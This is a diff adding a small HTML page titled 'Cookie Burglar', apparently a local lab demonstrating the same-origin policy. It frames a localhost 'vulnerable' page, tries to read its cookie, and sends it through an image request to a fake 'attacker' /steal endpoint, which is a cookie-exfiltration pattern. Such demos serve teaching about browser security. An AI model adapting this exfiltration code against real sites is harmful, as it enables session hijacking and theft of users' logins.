@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cookie Burglar</title>
+</head>
+<body>
+    <h1>Cookie Burglar Page</h1>
+    <p>I'm going to try to read the cookie from another page!</p>
+
+    <!-- Embedding the vulnerable site -->
+    <iframe src="http://localhost:4000/cookiejar/vulnerable.html" id="victim" height="300" width="600"></iframe>
+
+    <script>
+        // try to read the cookie of the iframe
+        setTimeout(function() {
+            const frame = document.getElementById("victim");
+
+            try {
+                const stolen = frame.contentDocument.cookie;
+                document.body.innerHTML += "<p>Stolen cookie: " + stolen + "</p>";
+
+                // send to fake “attacker” server
+                new Image().src = "http://localhost:4000/steal?cookie=" + stolen;
+
+            } catch (e) {
+                document.body.innerHTML += "<p>Could not read cookie due to Same-Origin Policy.</p>";
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
